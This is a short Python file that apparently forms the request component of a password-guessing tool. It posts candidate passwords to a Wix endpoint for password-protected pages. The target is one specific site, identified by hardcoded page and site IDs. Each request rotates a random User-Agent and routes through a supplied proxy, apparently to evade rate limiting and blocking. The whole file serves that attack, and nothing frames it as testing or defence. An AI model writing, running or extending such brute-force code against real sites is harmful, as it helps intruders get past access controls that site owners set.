import requests
from requests import Response
import ua_generator

def make_request(passwd: str, proxy: str) -> Response: 
    ua = ua_generator.generate()

    proxies = { proxy.split(':')[0]: proxy }

    print(proxies)

    a = requests.post(
        url="https://site-pages.wix.com/_api/wix-public-html-info-webapp/resolve_protected_page_urls",
        params={
            "siteRevision": "1765",
        },
        json={
            "password": passwd,
            "pageId":"bxgw5",
            "metaSiteId":"cdba672c-9447-473f-9957-3890262a102e",
            "siteId":"0c40bd98-0c99-4b98-91b1-7106ba665b72"
        },
        headers={
            "User-Agent": ua.text,
            "DNT": "1"
        },
        proxies=proxies
    )
    
    return a